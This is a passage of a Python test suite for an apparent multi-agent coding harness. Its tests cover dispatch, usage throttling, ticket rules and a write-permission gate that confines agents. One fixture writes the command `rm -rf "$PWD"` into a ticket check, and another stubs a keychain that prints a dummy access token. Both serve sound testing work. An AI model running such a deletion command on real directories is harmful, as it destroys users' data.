                            "TASK-0001"], capture_output=True, text=True)
        assert r.returncode == 0, (r.stdout, r.stderr)
        rec = json.load(open(os.path.join(af, "tracker", "receipts",
                                          "TASK-0001.json")))
        assert rec["green"] and rec["isolation"] == "worktree", rec
        assert rec["foreign_files"] == 1, rec
        assert not [d for d in os.listdir(os.path.join(af, ".worktrees"))
                    if d.startswith("_receipt-")]
        wl = subprocess.run(["git", "-C", tmp, "worktree", "list"],
                            capture_output=True, text=True).stdout
        assert "_receipt-" not in wl, wl


USAGE_PY = os.path.join(os.path.dirname(os.path.abspath(__file__)), "usage.py")


def test_usage_script_never_prints_the_token():
    with tempfile.TemporaryDirectory() as td:
        fake = os.path.join(td, "security")
        with open(fake, "w") as f:
            f.write('#!/bin/sh\necho \'{"claudeAiOauth": {"accessToken": '
                    '"SECRET-TOKEN-XYZ"}}\'\n')
        os.chmod(fake, 0o755)
        env = dict(os.environ, PATH=td + os.pathsep + os.environ.get("PATH", ""),
                   https_proxy="http://127.0.0.1:9", HTTPS_PROXY="http://127.0.0.1:9")
        r = subprocess.run([sys.executable, USAGE_PY, "--ceiling", "80"],
                           capture_output=True, text=True, env=env, timeout=60)
        assert r.returncode == 2, (r.stdout, r.stderr)
        assert "SECRET-TOKEN-XYZ" not in r.stdout + r.stderr
        out = json.loads(r.stdout)
        assert out["unknown"] and not out["throttle"], out
        # no keychain tool at all -> unknown, not a crash
        r = subprocess.run([sys.executable, USAGE_PY], capture_output=True,
                           text=True, env=dict(os.environ, PATH=td), timeout=60)
        assert r.returncode == 2 and json.loads(r.stdout)["unknown"], r.stdout


def test_dispatch_throttles_new_lanes_on_usage_ceiling():
    # kspace 2026-08-28: two HTTP 429 outages killed 13 lanes mid-work. At or
    # above the ceiling the plan offers nothing new; an unreadable usage is
    # flagged, never throttled (a cost optimisation must not idle a run).
    with tempfile.TemporaryDirectory() as tmp:
        af = _factory_repo(tmp)
        with open(os.path.join(af, "run.yaml"), "a") as f:
            f.write("usage_ceiling_5h: 80\n")
        _raw_ticket(af, "TASK-0001")
        stub = os.path.join(af, "scripts", "usage.py")

        def answer(payload):
            with open(stub, "w") as f:
                f.write("import json\nprint(json.dumps(%r))\n" % (payload,))
        answer({"throttle": True, "reason": "five_hour 91% >= ceiling 80%",
                "five_hour": {"percent": 91, "resets_at": "2026-08-28T19:50:00Z"}})
        plan = json.loads(_run(af, "dispatch.py"))
        assert plan["assign_to_builders"] == [] and plan["qa_batches"] == []
        fl = [f for f in plan["flags"] if f["kind"] == "throttled"]
        assert fl and fl[0]["resets_at"] == "2026-08-28T19:50:00Z", plan["flags"]
        answer({"unknown": True, "throttle": False, "reason": "no credential"})
        plan = json.loads(_run(af, "dispatch.py"))
        assert plan["assign_to_builders"] == ["TASK-0001"], plan
        assert any(f["kind"] == "usage_unknown" for f in plan["flags"])
        assert not any(f["kind"] == "throttled" for f in plan["flags"])


def test_dispatch_resume_cap_is_the_median_fresh_context():
    # The "prefer the warm agent" rule had no ceiling; kspace M1 resumed one
    # architect ~40 times on a 100-300k context (10.1M billed). The cap is
    # the median context of THIS run's fresh returns per role — resumes
    # (later rows of the same role+ticket pair) and earlier runs are ignored;
    # a role with under three samples gets the fallback.
    with tempfile.TemporaryDirectory() as tmp:
        af = _factory_repo(tmp)
        rows = [
            "2026-01-01T00:00:00Z\tbuilder\tTASK-0009\t10\t5\t999999",  # old run
            "# run\t2026-01-01T01:00:00Z\tsession",
            "2026-01-01T01:00:01Z\tbuilder\tTASK-0001\tspawned",
            "2026-01-01T01:10:00Z\tbuilder\tTASK-0001\t100\t60\t60000",
            "2026-01-01T01:20:00Z\tbuilder\tTASK-0001\t100\t60\t250000",  # resume
            "2026-01-01T01:10:00Z\tbuilder\tTASK-0002\t100\t60\t90000",
            "2026-01-01T01:10:00Z\tbuilder\tTASK-0003\t100\t60\t120000",
            "2026-01-01T01:10:00Z\tarchitect\tFEAT-0001\t100\t60\t200000",
        ]
        with open(os.path.join(af, "tracker", "spawn_log.tsv"), "w") as f:
            f.write("\n".join(rows) + "\n")
        plan = json.loads(_run(af, "dispatch.py"))
        assert plan["resume_cap"] == {"builder": 90000, "architect": 100000}, \
            plan["resume_cap"]


def test_packet_carries_lessons_when_present():
    # The architect's root-cause pass rewrites docs/LESSONS.md whole at each
    # milestone close; the packet is where a builder actually reads it.
    with tempfile.TemporaryDirectory() as tmp:
        af = _factory_repo(tmp)
        _raw_ticket(af, "TASK-0001")
        assert "=== LESSONS" not in _run(af, "ticket.py", "packet", "TASK-0001")
        os.makedirs(os.path.join(af, "docs"), exist_ok=True)
        with open(os.path.join(af, "docs", "LESSONS.md"), "w") as f:
            f.write("1. JS Number() is not int(): call js_number().\n")
        out = _run(af, "ticket.py", "packet", "TASK-0001")
        assert "=== LESSONS" in out and "js_number()" in out, out


def _tp(af, script, *args):
    """Like _run but returns the CompletedProcess (for expected refusals)."""
    return subprocess.run([sys.executable, os.path.join(af, "scripts", script)]
                          + list(args), capture_output=True, text=True)


def test_folded_close_and_parent_ruling_close():
    # BUG-0123/0124 (2026-08-22): a folded ticket parked `blocked` and
    # verified by QA needed dispatcher blocked→open + toolsmith open→done.
    # FEAT-0015/16/17, FEAT-0009/10: the architect ruled a parent closed and
    # a toolsmith was spawned to type the flip. Both edges now exist, each
    # guarded: --resolution required out of blocked; children-done for the
    # parent; leaf authority unchanged.
    with tempfile.TemporaryDirectory() as tmp:
        af = _factory_repo(tmp)
        _raw_ticket(af, "BUG-0001", ttype="bug", status="blocked")
        r = _tp(af, "ticket.py", "transition", "BUG-0001", "done", "--as", "qa",
                "--note", "verified the fold live")
        assert r.returncode != 0 and "--resolution" in r.stderr, r.stderr
        _run(af, "ticket.py", "transition", "BUG-0001", "done", "--as", "qa",
             "--note", "verified the fold live", "--resolution", "already_done")
        front = lib.parse_ticket(os.path.join(af, "tracker", "tickets",
                                              "BUG-0001.md"))["front"]
        assert front["status"] == "done" and front["resolution"] == "already_done"
        # parent ruling: architect flips a parent whose children are done
        _raw_ticket(af, "TASK-0001", status="done")
        path = _raw_ticket(af, "FEAT-0001", ttype="feat")
        body = open(path).read().replace("children: []", "children: [TASK-0001]")
        with open(path, "w") as f:
            f.write(body)
        _run(af, "ticket.py", "transition", "FEAT-0001", "done", "--as",
             "architect", "--note", "RULING-CLOSE: both halves landed")
        front = lib.parse_ticket(path)["front"]
        assert front["status"] == "done"
        # ... but not a leaf, and not a parent with open children
        _raw_ticket(af, "TASK-0002")
        r = _tp(af, "ticket.py", "transition", "TASK-0002", "done", "--as",
                "architect", "--note", "x")
        assert r.returncode != 0 and "not permitted" in r.stderr, r.stderr
        path = _raw_ticket(af, "FEAT-0002", ttype="feat")
        body = open(path).read().replace("children: []", "children: [TASK-0002]")
        with open(path, "w") as f:
            f.write(body)
        r = _tp(af, "ticket.py", "transition", "FEAT-0002", "done", "--as",
                "strategist", "--note", "x")
        assert r.returncode != 0 and "children not done" in r.stderr, r.stderr


def test_amend_title_replaces_heading_only():
    # 2026-08-28: three ruled ASK tickets stayed titled as questions forever —
    # no verb re-typed a title and the ticket gate blocks a direct edit.
    with tempfile.TemporaryDirectory() as tmp:
        af = _factory_repo(tmp)
        path = _raw_ticket(af, "TASK-0001", description="RULED: port them")
        r = _tp(af, "ticket.py", "amend-title", "TASK-0001", "--title", "x",
                "--as", "builder-1", "--note", "n")
        assert r.returncode != 0, r.stdout
        _run(af, "ticket.py", "amend-title", "TASK-0001", "--title",
             "Port t14, t15, t16 to pytest", "--as", "architect",
             "--note", "Ben ruled 2026-08-28")
        text = open(path).read()
        assert text.split("\n---\n", 1)[1].startswith(
            "# Port t14, t15, t16 to pytest\n"), text[:400]
        assert "title amended: Ben ruled 2026-08-28 [was: TASK-0001]" in text
        assert "## Description\nRULED: port them" in text


def test_suffixed_ticket_branch_is_flagged_and_held_from_qa():
    # BUG-0033 (2026-08-13, twice): a stale worktree made git suffix the next
    # attempt's branch (ticket/BUG-0033-3); the landing loop matched the exact
    # name only, skipped the merge silently, and still batched the ticket to
    # QA — which attacked a tree the fix never reached.
    with tempfile.TemporaryDirectory() as tmp:
        af = _factory_repo(tmp)
        _raw_ticket(af, "TASK-0001", status="built")
        subprocess.run(["git", "-C", tmp, "branch", "ticket/TASK-0001-2", "HEAD"],
                       check=True, capture_output=True)
        plan = json.loads(_run(af, "dispatch.py"))
        fl = [f for f in plan["flags"] if f["kind"] == "land_branch_suffixed"]
        assert fl and fl[0]["id"] == "TASK-0001" \
            and fl[0]["branches"] == ["ticket/TASK-0001-2"], plan["flags"]
        assert plan["qa_batches"] == [], plan["qa_batches"]
        subprocess.run(["git", "-C", tmp, "branch", "-m", "ticket/TASK-0001-2",
                        "ticket/TASK-0001"], check=True, capture_output=True)
        plan = json.loads(_run(af, "dispatch.py"))
        assert not any(f["kind"] == "land_branch_suffixed" for f in plan["flags"])


def test_scope_collision_sees_a_file_inside_a_scoped_directory():
    # 2026-08-22: BUG-0123 scoped one migration FILE, BUG-0125 the migrations
    # DIRECTORY — two writers on one staging DB, and the exact-path check
    # stayed silent; the architect caught it by hand.
    with tempfile.TemporaryDirectory() as tmp:
        af = _factory_repo(tmp)
        _raw_ticket(af, "BUG-0001", ttype="bug", scope="supabase/migrations")
        _raw_ticket(af, "BUG-0002", ttype="bug",
                    scope="supabase/migrations/20260821000001_x.sql")
        plan = json.loads(_run(af, "dispatch.py"))
        fl = [f for f in plan["flags"] if f["kind"] == "scope_collision"]
        assert fl and fl[0]["ids"] == ["BUG-0001", "BUG-0002"] \
            and fl[0]["paths"] == ["supabase/migrations"], plan["flags"]


def test_compaction_never_flags_a_ticket_about_to_close():
    with tempfile.TemporaryDirectory() as tmp:
        af = _factory_repo(tmp)
        big = "- 2026-01-01T00:00:00Z [test] " + "x" * 9000
        _raw_ticket(af, "TASK-0001", status="qa", history=big)
        _raw_ticket(af, "TASK-0002", status="built", history=big)
        _raw_ticket(af, "TASK-0003", status="open", history=big)
        plan = json.loads(_run(af, "dispatch.py"))
        flagged = {f["id"] for f in plan["flags"] if f["kind"] == "compact_candidate"}
        assert flagged == {"TASK-0003"}, flagged


def test_artifact_gate_allows_the_session_scratchpad():
    # 2026-08-31: blocking the harness's own scratchpad made the gate fight
    # the prompt every agent reads — 132 refusals one run, 56 the next.
    # The session scratchpad is allowed; bare /tmp stays blocked.
    sys.path.insert(0, os.path.dirname(ARTIFACT_GATE))
    import artifact_gate as ag
    pad = "/private/tmp/claude-501/-Users-x-proj/abc-123/scratchpad"
    assert not ag.outside(pad + "/probe.py", "/anywhere")
    assert not ag.outside("/tmp/claude-501/p/s/scratchpad/x", "/anywhere")
    assert ag.outside("/tmp/x", "/anywhere")
    assert ag.outside("/private/tmp/claude-501/p/s/elsewhere/x", "/anywhere")
    with tempfile.TemporaryDirectory() as proj:
        proj = os.path.realpath(proj)
        trk = os.path.join(proj, "agenticflow", "tracker")
        os.makedirs(trk)
        open(os.path.join(trk, "RUNNING"), "w").close()
        env = dict(os.environ, CLAUDE_PROJECT_DIR=proj)

        def gate(target):
            payload = json.dumps({"tool_name": "Write", "cwd": proj,
                                  "tool_input": {"file_path": target}})
            return subprocess.run([sys.executable, ARTIFACT_GATE],
                                  input=payload, capture_output=True,
                                  text=True, env=env).returncode
        assert gate(pad + "/notes.txt") == 0
        assert gate("/tmp/notes.txt") == 2


def test_receipt_survives_a_vanishing_worktree():
    # Three lanes in one day (2026-08-30): the receipt's private worktree was
    # deleted under a running check — dispatch's hygiene sweep saw a name
    # with no ticket and dropped it; one PASSED live suite was graded exit 1.
    # Now: the sweep skips _receipt-*, and a vanished tree grades as
    # "tree-vanished" (no verdict), never as a failure the check earned.
    with tempfile.TemporaryDirectory() as tmp:
        af = _factory_repo(tmp)
        # dispatch hygiene must leave a live receipt worktree alone
        keep = os.path.join(af, ".worktrees", "_receipt-4242")
        os.makedirs(keep)
        json.loads(_run(af, "dispatch.py"))
        assert os.path.isdir(keep), "hygiene sweep deleted a receipt worktree"
        os.rmdir(keep)
        # a check that deletes its own tree: later checks get no verdict
        path = _raw_ticket(af, "TASK-0001", status="qa")
        body = open(path).read().replace(
            "## History",
            "## Checks\n```sh\ntest -f app/main.py\nrm -rf \"$PWD\"\n"
            "test -f app/main.py\n```\n\n## History")
        with open(path, "w") as f:
            f.write(body)
        r = subprocess.run([sys.executable,
                            os.path.join(af, "scripts", "receipt.py"),
                            "TASK-0001"], capture_output=True, text=True)
        assert r.returncode == 1, (r.stdout, r.stderr)
        assert "Traceback" not in r.stderr, r.stderr
        rec = json.load(open(os.path.join(af, "tracker", "receipts",
                                          "TASK-0001.json")))
        exits = [c["exit"] for c in rec["commands"]]
        assert exits[0] == 0 and exits[2] == "tree-vanished", exits
        assert not rec["green"]


def test_dispatch_pushes_the_run_branch():
    # 2026-08-31: run/data-model sat 227 commits ahead of origin — a whole
    # campaign on one disk. dispatch now backs up the ACTIVE run branch:
    # first push sets upstream; idle/landing ticks re-push; non-run branches
    # and remoteless repos are left alone (and never flag).
    with tempfile.TemporaryDirectory() as tmp:
        af = _factory_repo(tmp)
        plan = json.loads(_run(af, "dispatch.py"))
        assert not any(f["kind"] == "push_failed" for f in plan["flags"]), \
            "a remoteless repo must not flag"
        bare = os.path.join(tmp, "origin.git")
        subprocess.run(["git", "init", "-q", "--bare", bare], check=True,
                       capture_output=True)
        subprocess.run(["git", "-C", tmp, "remote", "add", "origin", bare],
                       check=True, capture_output=True)
        # non-run branch: never pushed
        json.loads(_run(af, "dispatch.py"))
        r = subprocess.run(["git", "-C", bare, "branch"], capture_output=True,
                           text=True)
        assert r.stdout.strip() == "", r.stdout
        subprocess.run(["git", "-C", tmp, "checkout", "-q", "-b", "run/x"],
                       check=True, capture_output=True)
        json.loads(_run(af, "dispatch.py"))  # first push: sets upstream
        head = subprocess.run(["git", "-C", tmp, "rev-parse", "HEAD"],
                              capture_output=True, text=True).stdout.strip()
        got = subprocess.run(["git", "-C", bare, "rev-parse", "run/x"],
                             capture_output=True, text=True).stdout.strip()
        assert got == head, (got, head)
        with open(os.path.join(tmp, "app", "main.py"), "a") as f:
            f.write("# more\n")
        subprocess.run(["git", "-C", tmp, "commit", "-aqm", "tick work"],
                       check=True, capture_output=True)
        json.loads(_run(af, "dispatch.py"))  # idle tick: re-push
        head = subprocess.run(["git", "-C", tmp, "rev-parse", "HEAD"],
                              capture_output=True, text=True).stdout.strip()
        got = subprocess.run(["git", "-C", bare, "rev-parse", "run/x"],
                             capture_output=True, text=True).stdout.strip()
        assert got == head, (got, head)


def test_vision_new_tolerates_ship_phase0_running():
    # 2026-08-28, deterministic at every campaign open: /ship Phase 0 creates
    # RUNNING before Phase 1 can call `vision.py new`, which refused. `new`
    # now proceeds when nothing is actually in flight (no active campaign, or
    # a CLOSED one); switch/merge stay strict, and `new` over a live campaign
    # still refuses.
    with tempfile.TemporaryDirectory() as tmp:
        af = _factory_repo(tmp)  # creates tracker/RUNNING
        r = _tp(af, "vision.py", "new", "camp-a")
        assert r.returncode == 0, (r.stdout, r.stderr)
        assert os.path.islink(os.path.join(af, "docs", "vision"))
        # a second new over a LIVE campaign still refuses
        r = _tp(af, "vision.py", "new", "camp-b")
        assert r.returncode != 0 and "in flight" in r.stderr, r.stderr
        # CLOSED lifts it
        open(os.path.join(af, "visions", "camp-a", "CLOSED"), "w").close()
        r = _tp(af, "vision.py", "new", "camp-b")
        assert r.returncode == 0, (r.stdout, r.stderr)
        # switch stays strict while RUNNING exists
        r = _tp(af, "vision.py", "switch", "camp-a")
        assert r.returncode != 0 and "in flight" in r.stderr, r.stderr


def test_artifact_gate_sibling_policy():
    # Ben, 2026-09-01: minor essential sibling changes land autonomously
    # (write_by_size, recorded); read_only/undeclared writes are refused
    # toward a HANDOFF ticket; another factory's machinery and a sibling
    # with its own run in flight are always refused.
    with tempfile.TemporaryDirectory() as td:
        td = os.path.realpath(td)
        proj = os.path.join(td, "proj")
        sib_rw = os.path.join(td, "sib rw")     # space: path parsing must hold
        sib_ro = os.path.join(td, "sib-ro")
        undeclared = os.path.join(td, "elsewhere")
        for d in (os.path.join(proj, "agenticflow", "tracker"),
                  sib_rw, sib_ro, undeclared):
            os.makedirs(d)
        open(os.path.join(proj, "agenticflow", "tracker", "RUNNING"),
             "w").close()
        with open(os.path.join(proj, "agenticflow", "run.yaml"), "w") as f:
            f.write("sibling_dirs: %s=write_by_size,%s=read_only\n"
                    % (sib_rw, sib_ro))
        env = dict(os.environ, CLAUDE_PROJECT_DIR=proj)

        def gate(target):
            payload = json.dumps({"tool_name": "Write", "cwd": proj,
                                  "tool_input": {"file_path": target}})
            return subprocess.run([sys.executable, ARTIFACT_GATE],
                                  input=payload, capture_output=True,
                                  text=True, env=env)
        assert gate(os.path.join(sib_rw, "conf.yaml")).returncode == 0
        fires = open(os.path.join(proj, "agenticflow", "tracker",
                                  "gate_fires.tsv")).read()
        assert "recorded: sibling write" in fires and "conf.yaml" in fires
        r = gate(os.path.join(sib_ro, "conf.yaml"))
        assert r.returncode == 2 and "HANDOFF" in r.stderr, r.stderr
        r = gate(os.path.join(undeclared, "x.txt"))
        assert r.returncode == 2 and "HANDOFF" not in r.stderr, r.stderr
        r = gate(os.path.join(sib_rw, "agenticflow", "run.yaml"))
        assert r.returncode == 2 and "machinery" in r.stderr, r.stderr
        r = gate(os.path.join(sib_rw, ".claude", "agents", "builder.md"))
        assert r.returncode == 2 and "machinery" in r.stderr, r.stderr
        os.makedirs(os.path.join(sib_rw, "agenticflow", "tracker"))
        open(os.path.join(sib_rw, "agenticflow", "tracker", "RUNNING"),
             "w").close()
        r = gate(os.path.join(sib_rw, "conf2.yaml"))
        assert r.returncode == 2 and "own campaign" in r.stderr, r.stderr
        # Bash-target arm takes the same path
        payload = json.dumps({"tool_name": "Bash", "cwd": proj,
                              "tool_input": {"command": "echo x > '%s'"
                                             % os.path.join(sib_ro, "y")}})
        r = subprocess.run([sys.executable, ARTIFACT_GATE], input=payload,
                           capture_output=True, text=True, env=env)
        assert r.returncode == 2 and "HANDOFF" in r.stderr, r.stderr


if __name__ == "__main__":
    fns = [v for k, v in sorted(globals().items()) if k.startswith("test_")]
    for fn in fns:
        fn()
        print("ok  %s" % fn.__name__)
    print("%d factory test(s) passed" % len(fns))
